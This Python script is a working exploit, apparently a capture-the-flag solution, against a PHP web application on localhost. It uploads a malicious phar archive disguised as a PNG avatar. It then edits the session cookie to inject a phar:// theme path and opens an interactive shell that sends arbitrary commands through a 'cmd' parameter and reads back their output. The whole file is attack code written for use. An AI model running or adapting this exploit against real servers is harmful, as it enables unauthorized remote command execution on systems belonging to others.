import base64
import binascii
import json
import os
import re
import requests
import urllib.parse

URL = 'http://localhost/'

def b64decode(s):
  return base64.urlsafe_b64decode(s + '=' * (3 - (3 + len(s)) % 4))

# make exploit.phar
os.system('php -d phar.readonly=0 make_exploit.php')

# sign in
sess = requests.Session()
username = binascii.hexlify(os.urandom(8)).decode()
sess.post(URL + 'signin.php', data={'name': username})

# upload exploit.phar as exploit.png
with open('exploit.phar', 'rb') as f:
  sess.post(URL + 'upload.php', files={'file': ('exploit.png', f)})

sessdata = sess.cookies['session'].split('.')[0]
data = json.loads(b64decode(sessdata))
avatar = data['avatar']

# print flash message
sess.get(URL + 'upload.php', allow_redirects=False)
sessdata, sig = sess.cookies['session'].split('.')
payload = b64decode(sessdata).replace(b'}}', '}},"theme":"phar://uploads/{}/exploit"}}'.format(avatar).encode())
sess.cookies.set('session', base64.b64encode(payload).decode().replace('=', '') + '.' + sig)

# LFI
while True:
  command = input('> ')
  c = sess.get(URL + '?cmd=' + urllib.parse.quote(command)).content.decode()
  result = re.findall(r'/\* light/dark.css \*/(.+)/\*\*/', c, flags=re.DOTALL)[0]
  print(result.strip())